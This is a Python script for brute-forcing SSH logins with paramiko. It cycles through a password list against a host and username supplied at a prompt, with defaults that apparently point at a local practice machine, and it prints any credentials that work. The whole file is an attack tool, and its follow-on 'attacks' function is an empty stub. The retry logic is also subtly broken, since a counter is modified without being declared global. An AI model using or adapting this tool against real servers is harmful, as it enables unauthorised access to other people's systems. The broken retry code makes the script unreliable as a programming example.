import signal
import paramiko
import socket
import time
import colors
import banners
import password_checker

timeout_attempts = 0


def connect_ssh(hostname, username, password):
    client = paramiko.SSHClient()
    try:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    except:
        pass
    try:
        colors.print_warning(
            f"[ATTEMPTING CONNECTION] || {hostname} || {username}:{password}")
        client.connect(hostname=hostname, username=username,
                       password=password, timeout=3)
    except socket.timeout as err:
        colors.print_fail(f"[!] Invalid Host: {hostname}")
        raise err
    except paramiko.AuthenticationException:
        return None
    except paramiko.SSHException as err:
        timeout_attempts += 1
        if(timeout_attempts < 5):
            colors.print_info(f"Time Locked retrying... {timeout_attempts}/5")
            time.sleep(60)
            return connect_ssh(hostname, username, password)
        else:
            raise err
    except Exception as err:
        raise err

    colors.print_success("[+] CONNECTION ESTABLISHED:")

    print(f"""
    {colors.colors.ENDC}HOSTNAME: {colors.colors.HEADER}{hostname}
    {colors.colors.ENDC}USERNAME: {colors.colors.HEADER}{username}
    {colors.colors.ENDC}PASSWORD: {colors.colors.HEADER}{password}
    {colors.colors.ENDC}
    """)
    return client


def start_brute(host, username):
    for password in password_checker.passwords:
        try:
            client = connect_ssh(host, username, password)
            if(client):
                return client
        except Exception as err:
            print(err)
            return


def start_client_attacks(client):
    print("STARTING ATTACKS")
    print("ATTACKS FINISHED")


def main():
    banners.ssh_brute_banner()
    host = input("Host: ") or "192.168.56.104"
    username = input("Username: ") or "hackme"
    client = start_brute(host, username)
    if(client and input("Start Attacks? [Y]/n: ").capitalize() == "Y"):
        start_client_attacks(client)


def signal_handler(signal, frame):
    exit(0)


class BadHostException(BaseException):
    pass


class MaxAttempsReachedException(BaseException):
    pass


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    password_checker.load_passwords()
    main()
